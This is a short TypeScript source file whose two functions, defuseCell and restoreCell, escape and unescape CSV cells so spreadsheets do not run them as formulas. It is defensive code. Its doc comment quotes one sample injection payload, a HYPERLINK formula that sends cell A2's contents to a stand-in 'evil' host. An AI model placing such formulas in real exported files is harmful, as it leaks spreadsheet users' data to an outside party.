/**
 * A cell as a spreadsheet will not run it. A CSV is opened in Excel, Numbers or Sheets as often as it is read back
 * here, and a cell that starts with `=`, `+`, `-`, `@`, a tab or a carriage return is a formula there —
 * `=HYPERLINK("https://evil/?d="&A2, "click")` or a DDE call in a label someone else wrote. Such a cell gets a `'`
 * in front, which a spreadsheet shows as text. A number (`-5`, `+1.5e3`) is a number, not a formula, and stays as
 * it is. Lossless: a cell that already starts with `'` before one of those characters gets one more, and
 * `restoreCell` takes exactly one off, so a CSV written here reads back as it was.
 */
export function defuseCell(v: string): string {
  if (/^[-+]?(?:\d+\.?\d*|\.\d+)(?:e[-+]?\d+)?$/i.test(v)) return v
  return /^'*[=+\-@\t\r]/.test(v) ? `'${v}` : v
}

/** A cell as it was before `defuseCell`. */
export const restoreCell = (v: string): string => (/^'+[=+\-@\t\r]/.test(v) ? v.slice(1) : v)
